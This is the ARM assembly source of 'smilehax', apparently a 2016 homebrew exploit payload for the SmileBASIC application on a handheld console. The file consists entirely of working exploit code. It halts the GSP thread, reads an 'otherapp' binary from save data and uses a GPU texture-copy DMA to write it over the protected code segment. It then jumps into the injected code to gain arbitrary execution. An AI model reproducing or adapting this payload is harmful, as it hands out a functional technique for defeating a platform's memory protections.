/* smilehax - smilebasic exploit */
/* plutoo 2016 */

#include "macros.h"
#include "constants.h"

start:
    sub sp, #8
/* Tell GSP thread to fuck off. */
    ldr r4, =GSP_THREAD_OBJ_PTR
    mov r1, #1
    strb r1, [r4, #0x77]
    ldr r0, [r4, #0x2C]
    svc 0x18
    cmp r0, #0
    beq __signal_ok
    ldr r5, =0xc0deabad
    blx r5
__signal_ok:
/* Open otherapp binary. */
    add  r0, sp, #0       // file_handle_out
    adr  r1, otherapp_str // path
    mov  r2, #1           // flags=FILE_READ
    ldr  r5, =FS_OPEN_FILE
    blx  r5
    cmp r0, #0
    beq __openfile_ok
    ldr r5, =0xc0de0bad
    blx r5
__openfile_ok:
/* Read it. */
    ldr  r1, [sp]       // file_handle
    add  r0, sp, #4     // bytes_read_out
    mov  r2, #0         // offset_lo
    mov  r3, #0         // offset_hi
    ldr  r4, =CODE_BUF
    str  r4, [sp]       // dst
    ldr  r4, =OTHERAPP_SIZE
    str  r4, [sp, #4]   // size
    ldr  r5, =FS_READ_FILE
    blx  r5
    cmp r0, #0
    beq __readfile_ok
    ldr r5, =0xc0de1bad
    blx r5
__readfile_ok:
/* Gspwn it to code segment. */
    ldr  r0, =PA_TO_GPU_ADDR(OTHERAPP_CODE_PA) // dst
    ldr  r1, =CODE_BUF // src
    ldr  r2, =OTHERAPP_SIZE // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep
/* Grab GSP handle for next payload. */
    ldr  r3, =GSPGPU_SERVHANDLEADR
/* Set up param-blk for otherapp payload. */
    ldr  r0, =PARAMBLK_ADDR
    ldr  r1, =GSP_GX_CMD4
    str  r1, [r0, #0x1C] // gx_cmd4
    ldr  r1, =GSP_FLUSH_DATA_CACHE
    str  r1, [r0, #0x20] // flushdcache
    add  r2, r0, #0x48
    mov  r1, #0x8D       // flags
    str  r1, [r2]
    add  r2, r0, #0x58   // gsp_handle
    str  r3, [r2]
/* smea's magic does the rest. */
    ldr  r0, =PARAMBLK_ADDR  // param_blk
    ldr  r1, =0x10000000 - 4 // stack_ptr
    ldr  r2, =OTHERAPP_CODE_VA
    blx  r2

    ldr r5, =0xA9A9A9A9
    blx r5
.pool
otherapp_str:
    .string16 "save:/###/BOTHERAPP\0"
.align 4

/* small_sleep: Sleep for a while. */
small_sleep:
    mov  r0, #0x10000000
    mov  r1, #0
    svc  0x0A // svcSleepThread
    bx   lr

/* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
gsp_gxcmd_texturecopy:
    push {lr}
    sub  sp, #0x20

    mov r3, r0
    mov r0, r1
    mov r1, r3

    mov r3, #0
    str r3, [sp, #0]
    str r3, [sp, #4]
    str r3, [sp, #8]
    mov r3, #0x8
    str r3, [sp, #12]
    mov r3, #0

    ldr r4, =GSP_GX_CMD4
    blx r4

    /*mov  r4, #0

    mov  r5, #4          // cmd_type=TEXTURE_COPY
    str  r5, [sp]
    str  r1, [sp, #4]    // src_ptr=r1
    str  r0, [sp, #8]    // dst_ptr=r0
    str  r2, [sp, #0xC]  // size=r2
    str  r4, [sp, #0x10] // in_dimensions=0
    str  r4, [sp, #0x14] // out_dimensions=0
    mov  r5, #8
    str  r5, [sp, #0x18] // flags=8
    str  r4, [sp, #0x1C] // unused=0

    mov  r0, sp
    bl   gsp_execute_gpu_cmd*/
    add  sp, #0x20
    pop  {pc}
.pool

/*gsp_execute_gpu_cmd:
    push {lr}
    mov  r1, r0
    ldr  r4, =GSP_GET_INTERRUPTRECEIVER
    blx  r4
    add  r0, #0x58
    ldr  r4, =GSP_ENQUEUE_CMD
    blx  r4
    pop  {pc}
.pool*/

.org 0x400, 0x41
